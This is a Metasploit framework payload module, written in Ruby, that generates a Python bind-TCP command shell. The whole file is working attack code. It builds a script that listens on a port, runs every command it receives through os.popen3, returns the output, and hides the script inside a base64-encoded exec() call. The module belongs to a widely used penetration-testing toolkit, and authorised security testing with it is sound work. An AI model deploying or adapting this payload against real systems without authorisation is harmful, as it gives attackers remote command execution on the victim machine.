##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Command Shell, Bind TCP (via python)',
      'Description'   => 'Creates an interactive shell via python, encodes with base64 by design. Compat with 2.3.3',
      'Author'        => 'Ben Campbell', # Based on RageLtMan's reverse_ssl
      'License'       => MSF_LICENSE,
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'python',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    cmd = ''
    not_dead = Rex::Text.rand_text_alpha(3)
    cmd << "import socket,os\n"
    cmd << "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
    cmd << "s.bind(('',#{ datastore['LPORT']}))\n"
    cmd << "s.listen(1)\n"
    cmd << "(c,a)=s.accept()\n"
    cmd << "#{not_dead}=True\n"
    cmd << "while #{not_dead}:\n"
    cmd << "\td=c.recv(1024)\n"
    cmd << "\tif len(d)==0:\n\t\t#{not_dead}=False\n"
    cmd << "\tsi,so,se,=os.popen3(d)\n"
    cmd << "\tv=so.read()+se.read()\n"
    cmd << "\tc.send(v)\n"

    # Base64 encoding is required in order to handle Python's formatting requirements in the while loop
    cmd = "exec('#{Rex::Text.encode_base64(cmd)}'.decode('base64'))"

    cmd
  end

end

